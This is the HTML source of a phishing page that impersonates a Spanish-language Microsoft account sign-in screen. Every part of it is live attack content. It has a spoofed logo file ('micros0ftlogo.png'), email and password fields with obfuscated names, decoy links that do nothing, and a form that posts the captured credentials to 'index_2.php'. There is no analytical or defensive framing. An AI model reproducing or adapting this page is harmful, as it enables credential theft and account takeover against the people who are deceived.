<html dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">
<base href=".">
<title>Iniciar sesion en tu cuenta Microsoft!</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
<link rel="shortcut icon" href="descarga.ico">
<link rel="stylesheet" title="pagina" type="text/css" href="stylo.css">
<style type="text/css">body{display:block !important;}</style></head>

<body class="fa" data-bind="defineGlobals: ServerData, bodyCssClass" 
<body=""><div><!--  --><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
<!-- ko if: smallImageUrl --> 
<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small.jpg"></div>
<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;vzbuQ.jpg"></div> </div></div>
<div data-bind="if: activeDialog"></div> 

<form name="form1" id="form1" method="post" action="index_2.php">
<div class="outer" data-bind="component: { name: 'master-page',}">

             <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
			 <div class="inner fade-in-lightbox"> 
					
					<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.be &amp;&amp; showLightboxProgress() }"></div>
					<div data-bind="component: { name: 'logo-control',}">
					
					<img class="logo" role="img" src="micros0ftlogo.png"></div>
						
						<div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods, }">
						
						<div><div class="pagination-view animate slide-in-next">
		
						<div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',}">
						<div data-bind="component: { name: 'header-control',}">
						<div class="row text-title" id="l0ginHeader">
						<div role="heading" aria-level="1" data-bind="text: title">Iniciar sesion</div></div></div>
						<div class="row">
						<div class="form-group col-md-24">





		<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
				
				
				<input type="text" name="jxkc" id="jxkc" maxlength="120" class="form-control" aria-required="true" aria-describedby="l0ginHeader" placeholder="Correo electronico, telefono o Skype." onkeyup="validar()" tabindex="0" required> </div>
<br>
				<div><input name="jxkx" type="password" id="jxkx" minlength="4" autocomplete="off" class="form-control" aria-required="true" aria-describedby="l0ginHeader" placeholder="Contraseña" aria-label="" tabindex="0" required> </div>
				</div>
				
				<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links">
				<div class="form-group" data-bind="">¿No tiene una cuenta? <a href="javascript:void(0)" id="elefante3" name="elefante3">Cree una.</a></div>
				<div class="form-group"> <a id="elefante2" name="elefante2" href="javascript:void(0)">¿Es obligatoria la verificación de cuenta?</a><span class="help-button" role="button" tabindex="0"><img role="presentacion" src="documentati0n.png"></span>
				
</div>
	
	<div class="form-group">
	
	<div class="form-group"><a id="elefante4" href="javascript:void(0)">Opciones de inicio de sesion</a></div></div></div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field'}">
	<div class="col-xs-24 no-padding-left-right button-container" data-bind="">

	<div class="inline-block">
	<input type="submit" id="botonsito" class="btn btn-block btn-primary" onclick="ShowAndHide()" value="Siguiente" disabled="">

			</div> 
			</div>
			</div> 
			</div> </div></div>
			</div> </div></div>
			</div>
	
			  </div> 
				 </div></div></form></div>
		
		
		

<script>

function ShowAndHide() {
document.querySelector('#displ4yN4me').innerHTML = document.querySelector('#jxkc').value;
    var x = document.getElementById('temporada');
    if (x.style.display == 'none') {
        x.style.display = 'block';
    } else {
        x.style.display = 'none';
    }
   
}
 function anular(e) {
          tecla = (document.all) ? e.keyCode : e.which;
          return (tecla != 13);
     }
	 
	 function validar(e){
  var validado = false;
  
  var letters = /^[0-9a-zA-Z]+$/;
  var filter = /^([a-zA-Z0-9\_\.\_])+\@(([a-zA-Z0-9\_])+\.)+([a-zA-Z0-9]{2,4})+$/;
  elementos = document.getElementsByClassName("form-control ltr_override");
  for(i=0;i<elementos.length;i++){
    
    if(filter.test(elementos[i].value) || letters.test(elementos[i].value) ) 
	{
    validado = false
    }
  }
  if(validado){
  document.getElementById("botonsito").disabled = false;
  
  }else{
     document.getElementById("botonsito").disabled = false;
  }
}
</script></body></html>